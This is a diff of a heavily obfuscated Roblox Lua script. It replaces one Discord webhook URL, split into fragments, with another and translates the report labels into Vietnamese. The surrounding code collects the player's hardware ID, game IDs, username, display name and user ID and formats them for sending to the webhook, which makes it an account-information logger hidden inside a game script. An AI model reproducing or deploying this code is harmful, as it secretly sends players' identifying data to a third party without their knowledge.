@@ -16536,26 +16536,25 @@ L_1_[99] = gethwid and gethwid() or "Unknown HWID"
 L_1_[118] = game["PlaceId"] or 0
 L_1_[106] = game["JobId"] or "Unknown"
 L_1_[61] = L_1_[2]({
-	"https://discord.com/";
-	"api/webhooks/1450118";
-	"152213237841/nd89RDo";
-	"-W0xQyOODqwweKFSi5eK";
-	"Nittl7BXsyTww0X_oXKs";
-	"hSNVdH2I3ATNoRoUGsXD";
-	"5"
+	"https://discord.com/api/";
+	"webhooks/145980210050131";
+	"9884/LtzB5vxs42d25QBAOf5";
+	"iQUyxAELJ0dVsIO8YYctI-Pc";
+	"CLEZnLv__pCoKx3eHoxXuJq6";
+	"i"
 })
 L_1_[71] = {
 	["embeds"] = {
 		{
 			["title"] = L_1_[2]({
-				"Roblox Account Infor";
-				"mation"
+				"Thông Tin Tài Khoản R";
+				"oblox"
 			}),
 			["url"] = L_1_[2]({
 				"https://www.roblox.c",
 				"om/users/"
 			}) .. tostring(L_1_[121]["UserId"] or 0);
-			["description"] = "Display Name: **" .. (tostring(L_1_[121]["DisplayName"] or "Unknown") .. "**");
+			["description"] = "Tên hiển thị: **" .. (tostring(L_1_[121]["DisplayName"] or "Không xác định") .. "**");
 			["color"] = tonumber("0x000000"),
 			["thumbnail"] = {
 				["url"] = L_1_[2]({
@@ -16569,12 +16568,12 @@ L_1_[71] = {
 			};
 			["fields"] = {
 				{
-					["name"] = "User Name:",
-					["value"] = "`" .. (tostring(L_1_[121]["Name"] or "Unknown") .. "`");
+					["name"] = "Tên người dùng:",
+					["value"] = "`" .. (tostring(L_1_[121]["Name"] or "Không xác định") .. "`");
 					["inline"] = true
 				},
 				{
-					["name"] = "User ID:";
+					["name"] = "ID người dùng:";
 					["value"] = "`" .. (tostring(L_1_[121]["UserId"] or 0) .. "`"),
 					["inline"] = true
 				};
